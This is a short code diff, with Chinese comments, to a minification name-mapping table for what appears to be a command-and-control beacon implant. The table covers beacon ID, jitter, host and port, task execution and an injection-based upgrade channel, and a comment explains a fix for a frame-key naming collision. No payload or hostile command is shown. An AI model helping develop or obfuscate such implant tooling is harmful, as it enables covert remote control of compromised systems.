@@ -23,7 +23,13 @@ CONTRACT = {
     # 全局
     "MASTER_KEY": "_K", "HOST": "_H", "PORT": "_P", "INTERVAL": "_I",
     "JITTER": "_J", "BEACON_ID": "_D", "BREAK_FLAG": "_B",
-    "CONN_KEY": "_CK", "PRINT_LOCK": "_L",
+    # 帧加密密钥变量(minify 后避开 _CK:模板源码同时存在"逻辑连接密钥 _CK"
+    # 与"帧密钥 CONN_KEY",CONTRACT 若把 CONN_KEY 也映射成 _CK,cycle 的
+    # CONN_KEY=_CK 同步行在 minify 产物里变成 _CK=_CK 语义翻转——uplevel
+    # 注入代码(_disp)写 _CK 设的是帧密钥本身,随后被 cycle 重置回部署密钥,
+    # 升级通道帧密钥永远错位(2026-09-04 修复:帧密钥映射独立短名 _F,
+    # _CK 锁定为逻辑密钥名,未 minify/minify 两形态同构))
+    "CONN_KEY": "_F", "_CK": "_CK", "PRINT_LOCK": "_L",
     # 函数
     "connect_transport": "_T", "send_frame": "p", "recv_frame": "q",
     "exec_task": "r", "sleep_jitter": "s", "qround": "Q",
